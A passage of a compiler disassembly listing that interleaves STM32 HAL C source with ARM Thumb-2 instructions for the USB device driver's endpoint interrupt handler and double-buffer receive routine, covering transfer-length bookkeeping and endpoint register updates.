 8002cd6:	429a      	cmp	r2, r3
 8002cd8:	d206      	bcs.n	8002ce8 <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002cda:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cdc:	781b      	ldrb	r3, [r3, #0]
 8002cde:	4619      	mov	r1, r3
 8002ce0:	6878      	ldr	r0, [r7, #4]
 8002ce2:	f009 ff3d 	bl	800cb60 <HAL_PCD_DataOutStageCallback>
 8002ce6:	e005      	b.n	8002cf4 <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002ce8:	687b      	ldr	r3, [r7, #4]
 8002cea:	681b      	ldr	r3, [r3, #0]
 8002cec:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002cee:	4618      	mov	r0, r3
 8002cf0:	f003 ffe3 	bl	8006cba <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002cf4:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002cf8:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002cfc:	2b00      	cmp	r3, #0
 8002cfe:	f000 8121 	beq.w	8002f44 <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002d02:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002d06:	1c5a      	adds	r2, r3, #1
 8002d08:	4613      	mov	r3, r2
 8002d0a:	009b      	lsls	r3, r3, #2
 8002d0c:	4413      	add	r3, r2
 8002d0e:	00db      	lsls	r3, r3, #3
 8002d10:	687a      	ldr	r2, [r7, #4]
 8002d12:	4413      	add	r3, r2
 8002d14:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002d16:	687b      	ldr	r3, [r7, #4]
 8002d18:	681b      	ldr	r3, [r3, #0]
 8002d1a:	461a      	mov	r2, r3
 8002d1c:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002d20:	009b      	lsls	r3, r3, #2
 8002d22:	4413      	add	r3, r2
 8002d24:	881b      	ldrh	r3, [r3, #0]
 8002d26:	b29b      	uxth	r3, r3
 8002d28:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002d2c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002d30:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002d34:	687b      	ldr	r3, [r7, #4]
 8002d36:	681b      	ldr	r3, [r3, #0]
 8002d38:	461a      	mov	r2, r3
 8002d3a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002d3e:	009b      	lsls	r3, r3, #2
 8002d40:	441a      	add	r2, r3
 8002d42:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002d46:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002d4a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002d4e:	b29b      	uxth	r3, r3
 8002d50:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002d52:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d54:	78db      	ldrb	r3, [r3, #3]
 8002d56:	2b01      	cmp	r3, #1
 8002d58:	f040 80a2 	bne.w	8002ea0 <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002d5c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d5e:	2200      	movs	r2, #0
 8002d60:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002d62:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d64:	7b1b      	ldrb	r3, [r3, #12]
 8002d66:	2b00      	cmp	r3, #0
 8002d68:	f000 8093 	beq.w	8002e92 <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002d6c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002d70:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002d74:	2b00      	cmp	r3, #0
 8002d76:	d046      	beq.n	8002e06 <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002d78:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d7a:	785b      	ldrb	r3, [r3, #1]
 8002d7c:	2b00      	cmp	r3, #0
 8002d7e:	d126      	bne.n	8002dce <PCD_EP_ISR_Handler+0x5f8>
 8002d80:	687b      	ldr	r3, [r7, #4]
 8002d82:	681b      	ldr	r3, [r3, #0]
 8002d84:	627b      	str	r3, [r7, #36]	; 0x24
 8002d86:	687b      	ldr	r3, [r7, #4]
 8002d88:	681b      	ldr	r3, [r3, #0]
 8002d8a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002d8e:	b29b      	uxth	r3, r3
 8002d90:	461a      	mov	r2, r3
 8002d92:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002d94:	4413      	add	r3, r2
 8002d96:	627b      	str	r3, [r7, #36]	; 0x24
 8002d98:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002d9a:	781b      	ldrb	r3, [r3, #0]
 8002d9c:	00da      	lsls	r2, r3, #3
 8002d9e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002da0:	4413      	add	r3, r2
 8002da2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002da6:	623b      	str	r3, [r7, #32]
 8002da8:	6a3b      	ldr	r3, [r7, #32]
 8002daa:	881b      	ldrh	r3, [r3, #0]
 8002dac:	b29b      	uxth	r3, r3
 8002dae:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002db2:	b29a      	uxth	r2, r3
 8002db4:	6a3b      	ldr	r3, [r7, #32]
 8002db6:	801a      	strh	r2, [r3, #0]
 8002db8:	6a3b      	ldr	r3, [r7, #32]
 8002dba:	881b      	ldrh	r3, [r3, #0]
 8002dbc:	b29b      	uxth	r3, r3
 8002dbe:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002dc2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002dc6:	b29a      	uxth	r2, r3
 8002dc8:	6a3b      	ldr	r3, [r7, #32]
 8002dca:	801a      	strh	r2, [r3, #0]
 8002dcc:	e061      	b.n	8002e92 <PCD_EP_ISR_Handler+0x6bc>
 8002dce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002dd0:	785b      	ldrb	r3, [r3, #1]
 8002dd2:	2b01      	cmp	r3, #1
 8002dd4:	d15d      	bne.n	8002e92 <PCD_EP_ISR_Handler+0x6bc>
 8002dd6:	687b      	ldr	r3, [r7, #4]
 8002dd8:	681b      	ldr	r3, [r3, #0]
 8002dda:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002ddc:	687b      	ldr	r3, [r7, #4]
 8002dde:	681b      	ldr	r3, [r3, #0]
 8002de0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002de4:	b29b      	uxth	r3, r3
 8002de6:	461a      	mov	r2, r3
 8002de8:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002dea:	4413      	add	r3, r2
 8002dec:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002dee:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002df0:	781b      	ldrb	r3, [r3, #0]
 8002df2:	00da      	lsls	r2, r3, #3
 8002df4:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002df6:	4413      	add	r3, r2
 8002df8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002dfc:	62bb      	str	r3, [r7, #40]	; 0x28
 8002dfe:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002e00:	2200      	movs	r2, #0
 8002e02:	801a      	strh	r2, [r3, #0]
 8002e04:	e045      	b.n	8002e92 <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002e06:	687b      	ldr	r3, [r7, #4]
 8002e08:	681b      	ldr	r3, [r3, #0]
 8002e0a:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002e0c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e0e:	785b      	ldrb	r3, [r3, #1]
 8002e10:	2b00      	cmp	r3, #0
 8002e12:	d126      	bne.n	8002e62 <PCD_EP_ISR_Handler+0x68c>
 8002e14:	687b      	ldr	r3, [r7, #4]
 8002e16:	681b      	ldr	r3, [r3, #0]
 8002e18:	637b      	str	r3, [r7, #52]	; 0x34
 8002e1a:	687b      	ldr	r3, [r7, #4]
 8002e1c:	681b      	ldr	r3, [r3, #0]
 8002e1e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002e22:	b29b      	uxth	r3, r3
 8002e24:	461a      	mov	r2, r3
 8002e26:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002e28:	4413      	add	r3, r2
 8002e2a:	637b      	str	r3, [r7, #52]	; 0x34
 8002e2c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e2e:	781b      	ldrb	r3, [r3, #0]
 8002e30:	00da      	lsls	r2, r3, #3
 8002e32:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002e34:	4413      	add	r3, r2
 8002e36:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002e3a:	633b      	str	r3, [r7, #48]	; 0x30
 8002e3c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002e3e:	881b      	ldrh	r3, [r3, #0]
 8002e40:	b29b      	uxth	r3, r3
 8002e42:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002e46:	b29a      	uxth	r2, r3
 8002e48:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002e4a:	801a      	strh	r2, [r3, #0]
 8002e4c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002e4e:	881b      	ldrh	r3, [r3, #0]
 8002e50:	b29b      	uxth	r3, r3
 8002e52:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002e56:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002e5a:	b29a      	uxth	r2, r3
 8002e5c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002e5e:	801a      	strh	r2, [r3, #0]
 8002e60:	e017      	b.n	8002e92 <PCD_EP_ISR_Handler+0x6bc>
 8002e62:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e64:	785b      	ldrb	r3, [r3, #1]
 8002e66:	2b01      	cmp	r3, #1
 8002e68:	d113      	bne.n	8002e92 <PCD_EP_ISR_Handler+0x6bc>
 8002e6a:	687b      	ldr	r3, [r7, #4]
 8002e6c:	681b      	ldr	r3, [r3, #0]
 8002e6e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002e72:	b29b      	uxth	r3, r3
 8002e74:	461a      	mov	r2, r3
 8002e76:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002e78:	4413      	add	r3, r2
 8002e7a:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002e7c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e7e:	781b      	ldrb	r3, [r3, #0]
 8002e80:	00da      	lsls	r2, r3, #3
 8002e82:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002e84:	4413      	add	r3, r2
 8002e86:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002e8a:	63bb      	str	r3, [r7, #56]	; 0x38
 8002e8c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002e8e:	2200      	movs	r2, #0
 8002e90:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002e92:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002e94:	781b      	ldrb	r3, [r3, #0]
 8002e96:	4619      	mov	r1, r3
 8002e98:	6878      	ldr	r0, [r7, #4]
 8002e9a:	f009 fe7c 	bl	800cb96 <HAL_PCD_DataInStageCallback>
 8002e9e:	e051      	b.n	8002f44 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002ea0:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ea4:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002ea8:	2b00      	cmp	r3, #0
 8002eaa:	d144      	bne.n	8002f36 <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002eac:	687b      	ldr	r3, [r7, #4]
 8002eae:	681b      	ldr	r3, [r3, #0]
 8002eb0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002eb4:	b29b      	uxth	r3, r3
 8002eb6:	461a      	mov	r2, r3
 8002eb8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002eba:	781b      	ldrb	r3, [r3, #0]
 8002ebc:	00db      	lsls	r3, r3, #3
 8002ebe:	4413      	add	r3, r2
 8002ec0:	687a      	ldr	r2, [r7, #4]
 8002ec2:	6812      	ldr	r2, [r2, #0]
 8002ec4:	4413      	add	r3, r2
 8002ec6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002eca:	881b      	ldrh	r3, [r3, #0]
 8002ecc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ed0:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002ed4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ed6:	699a      	ldr	r2, [r3, #24]
 8002ed8:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002edc:	429a      	cmp	r2, r3
 8002ede:	d907      	bls.n	8002ef0 <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002ee0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ee2:	699a      	ldr	r2, [r3, #24]
 8002ee4:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002ee8:	1ad2      	subs	r2, r2, r3
 8002eea:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002eec:	619a      	str	r2, [r3, #24]
 8002eee:	e002      	b.n	8002ef6 <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002ef0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ef2:	2200      	movs	r2, #0
 8002ef4:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002ef6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ef8:	699b      	ldr	r3, [r3, #24]
 8002efa:	2b00      	cmp	r3, #0
 8002efc:	d106      	bne.n	8002f0c <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002efe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002f00:	781b      	ldrb	r3, [r3, #0]
 8002f02:	4619      	mov	r1, r3
 8002f04:	6878      	ldr	r0, [r7, #4]
 8002f06:	f009 fe46 	bl	800cb96 <HAL_PCD_DataInStageCallback>
 8002f0a:	e01b      	b.n	8002f44 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002f0c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002f0e:	695a      	ldr	r2, [r3, #20]
 8002f10:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002f14:	441a      	add	r2, r3
 8002f16:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002f18:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002f1a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002f1c:	69da      	ldr	r2, [r3, #28]
 8002f1e:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002f22:	441a      	add	r2, r3
 8002f24:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002f26:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002f28:	687b      	ldr	r3, [r7, #4]
 8002f2a:	681b      	ldr	r3, [r3, #0]
 8002f2c:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002f2e:	4618      	mov	r0, r3
 8002f30:	f003 fec3 	bl	8006cba <USB_EPStartXfer>
 8002f34:	e006      	b.n	8002f44 <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002f36:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002f3a:	461a      	mov	r2, r3
 8002f3c:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002f3e:	6878      	ldr	r0, [r7, #4]
 8002f40:	f000 f917 	bl	8003172 <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002f44:	687b      	ldr	r3, [r7, #4]
 8002f46:	681b      	ldr	r3, [r3, #0]
 8002f48:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002f4c:	b29b      	uxth	r3, r3
 8002f4e:	b21b      	sxth	r3, r3
 8002f50:	2b00      	cmp	r3, #0
 8002f52:	f6ff ac45 	blt.w	80027e0 <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002f56:	2300      	movs	r3, #0
}
 8002f58:	4618      	mov	r0, r3
 8002f5a:	3758      	adds	r7, #88	; 0x58
 8002f5c:	46bd      	mov	sp, r7
 8002f5e:	bd80      	pop	{r7, pc}

08002f60 <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002f60:	b580      	push	{r7, lr}
 8002f62:	b088      	sub	sp, #32
 8002f64:	af00      	add	r7, sp, #0
 8002f66:	60f8      	str	r0, [r7, #12]
 8002f68:	60b9      	str	r1, [r7, #8]
 8002f6a:	4613      	mov	r3, r2
 8002f6c:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002f6e:	88fb      	ldrh	r3, [r7, #6]
 8002f70:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002f74:	2b00      	cmp	r3, #0
 8002f76:	d07c      	beq.n	8003072 <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002f78:	68fb      	ldr	r3, [r7, #12]
 8002f7a:	681b      	ldr	r3, [r3, #0]
 8002f7c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f80:	b29b      	uxth	r3, r3
 8002f82:	461a      	mov	r2, r3
 8002f84:	68bb      	ldr	r3, [r7, #8]
 8002f86:	781b      	ldrb	r3, [r3, #0]
 8002f88:	00db      	lsls	r3, r3, #3
 8002f8a:	4413      	add	r3, r2
 8002f8c:	68fa      	ldr	r2, [r7, #12]
 8002f8e:	6812      	ldr	r2, [r2, #0]
 8002f90:	4413      	add	r3, r2
 8002f92:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f96:	881b      	ldrh	r3, [r3, #0]
 8002f98:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f9c:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002f9e:	68bb      	ldr	r3, [r7, #8]
 8002fa0:	699a      	ldr	r2, [r3, #24]
 8002fa2:	8b7b      	ldrh	r3, [r7, #26]
 8002fa4:	429a      	cmp	r2, r3
 8002fa6:	d306      	bcc.n	8002fb6 <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002fa8:	68bb      	ldr	r3, [r7, #8]
 8002faa:	699a      	ldr	r2, [r3, #24]
 8002fac:	8b7b      	ldrh	r3, [r7, #26]
 8002fae:	1ad2      	subs	r2, r2, r3
 8002fb0:	68bb      	ldr	r3, [r7, #8]
 8002fb2:	619a      	str	r2, [r3, #24]
 8002fb4:	e002      	b.n	8002fbc <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002fb6:	68bb      	ldr	r3, [r7, #8]
 8002fb8:	2200      	movs	r2, #0
 8002fba:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002fbc:	68bb      	ldr	r3, [r7, #8]
 8002fbe:	699b      	ldr	r3, [r3, #24]
 8002fc0:	2b00      	cmp	r3, #0
 8002fc2:	d123      	bne.n	800300c <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002fc4:	68fb      	ldr	r3, [r7, #12]
 8002fc6:	681b      	ldr	r3, [r3, #0]
 8002fc8:	461a      	mov	r2, r3
 8002fca:	68bb      	ldr	r3, [r7, #8]
 8002fcc:	781b      	ldrb	r3, [r3, #0]
 8002fce:	009b      	lsls	r3, r3, #2
 8002fd0:	4413      	add	r3, r2
 8002fd2:	881b      	ldrh	r3, [r3, #0]
 8002fd4:	b29b      	uxth	r3, r3
 8002fd6:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002fda:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002fde:	833b      	strh	r3, [r7, #24]
 8002fe0:	8b3b      	ldrh	r3, [r7, #24]
 8002fe2:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002fe6:	833b      	strh	r3, [r7, #24]
 8002fe8:	68fb      	ldr	r3, [r7, #12]
 8002fea:	681b      	ldr	r3, [r3, #0]
 8002fec:	461a      	mov	r2, r3
 8002fee:	68bb      	ldr	r3, [r7, #8]
 8002ff0:	781b      	ldrb	r3, [r3, #0]
 8002ff2:	009b      	lsls	r3, r3, #2
 8002ff4:	441a      	add	r2, r3
 8002ff6:	8b3b      	ldrh	r3, [r7, #24]
 8002ff8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002ffc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003000:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8003004:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003008:	b29b      	uxth	r3, r3
 800300a:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 800300c:	88fb      	ldrh	r3, [r7, #6]
 800300e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8003012:	2b00      	cmp	r3, #0
 8003014:	d01f      	beq.n	8003056 <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8003016:	68fb      	ldr	r3, [r7, #12]
 8003018:	681b      	ldr	r3, [r3, #0]
 800301a:	461a      	mov	r2, r3
 800301c:	68bb      	ldr	r3, [r7, #8]
 800301e:	781b      	ldrb	r3, [r3, #0]
 8003020:	009b      	lsls	r3, r3, #2
 8003022:	4413      	add	r3, r2
 8003024:	881b      	ldrh	r3, [r3, #0]
 8003026:	b29b      	uxth	r3, r3
 8003028:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800302c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003030:	82fb      	strh	r3, [r7, #22]
 8003032:	68fb      	ldr	r3, [r7, #12]
 8003034:	681b      	ldr	r3, [r3, #0]
 8003036:	461a      	mov	r2, r3
 8003038:	68bb      	ldr	r3, [r7, #8]
 800303a:	781b      	ldrb	r3, [r3, #0]
 800303c:	009b      	lsls	r3, r3, #2
 800303e:	441a      	add	r2, r3
 8003040:	8afb      	ldrh	r3, [r7, #22]
 8003042:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003046:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800304a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800304e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8003052:	b29b      	uxth	r3, r3
 8003054:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8003056:	8b7b      	ldrh	r3, [r7, #26]
 8003058:	2b00      	cmp	r3, #0
 800305a:	f000 8085 	beq.w	8003168 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 800305e:	68fb      	ldr	r3, [r7, #12]
 8003060:	6818      	ldr	r0, [r3, #0]
 8003062:	68bb      	ldr	r3, [r7, #8]
 8003064:	6959      	ldr	r1, [r3, #20]
 8003066:	68bb      	ldr	r3, [r7, #8]
 8003068:	891a      	ldrh	r2, [r3, #8]
 800306a:	8b7b      	ldrh	r3, [r7, #26]
 800306c:	f005 fb73 	bl	8008756 <USB_ReadPMA>
 8003070:	e07a      	b.n	8003168 <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8003072:	68fb      	ldr	r3, [r7, #12]
 8003074:	681b      	ldr	r3, [r3, #0]
 8003076:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800307a:	b29b      	uxth	r3, r3
 800307c:	461a      	mov	r2, r3
 800307e:	68bb      	ldr	r3, [r7, #8]
 8003080:	781b      	ldrb	r3, [r3, #0]
 8003082:	00db      	lsls	r3, r3, #3
 8003084:	4413      	add	r3, r2
 8003086:	68fa      	ldr	r2, [r7, #12]
 8003088:	6812      	ldr	r2, [r2, #0]
 800308a:	4413      	add	r3, r2
 800308c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003090:	881b      	ldrh	r3, [r3, #0]
 8003092:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003096:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8003098:	68bb      	ldr	r3, [r7, #8]
 800309a:	699a      	ldr	r2, [r3, #24]
 800309c:	8b7b      	ldrh	r3, [r7, #26]
 800309e:	429a      	cmp	r2, r3
 80030a0:	d306      	bcc.n	80030b0 <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 80030a2:	68bb      	ldr	r3, [r7, #8]
 80030a4:	699a      	ldr	r2, [r3, #24]
 80030a6:	8b7b      	ldrh	r3, [r7, #26]
 80030a8:	1ad2      	subs	r2, r2, r3
 80030aa:	68bb      	ldr	r3, [r7, #8]
 80030ac:	619a      	str	r2, [r3, #24]
 80030ae:	e002      	b.n	80030b6 <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 80030b0:	68bb      	ldr	r3, [r7, #8]
 80030b2:	2200      	movs	r2, #0
 80030b4:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 80030b6:	68bb      	ldr	r3, [r7, #8]
 80030b8:	699b      	ldr	r3, [r3, #24]
 80030ba:	2b00      	cmp	r3, #0
 80030bc:	d123      	bne.n	8003106 <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 80030be:	68fb      	ldr	r3, [r7, #12]
 80030c0:	681b      	ldr	r3, [r3, #0]
 80030c2:	461a      	mov	r2, r3
 80030c4:	68bb      	ldr	r3, [r7, #8]
 80030c6:	781b      	ldrb	r3, [r3, #0]
 80030c8:	009b      	lsls	r3, r3, #2
 80030ca:	4413      	add	r3, r2
 80030cc:	881b      	ldrh	r3, [r3, #0]
 80030ce:	b29b      	uxth	r3, r3
 80030d0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80030d4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80030d8:	83fb      	strh	r3, [r7, #30]
 80030da:	8bfb      	ldrh	r3, [r7, #30]
 80030dc:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80030e0:	83fb      	strh	r3, [r7, #30]
 80030e2:	68fb      	ldr	r3, [r7, #12]
 80030e4:	681b      	ldr	r3, [r3, #0]
 80030e6:	461a      	mov	r2, r3
 80030e8:	68bb      	ldr	r3, [r7, #8]
 80030ea:	781b      	ldrb	r3, [r3, #0]
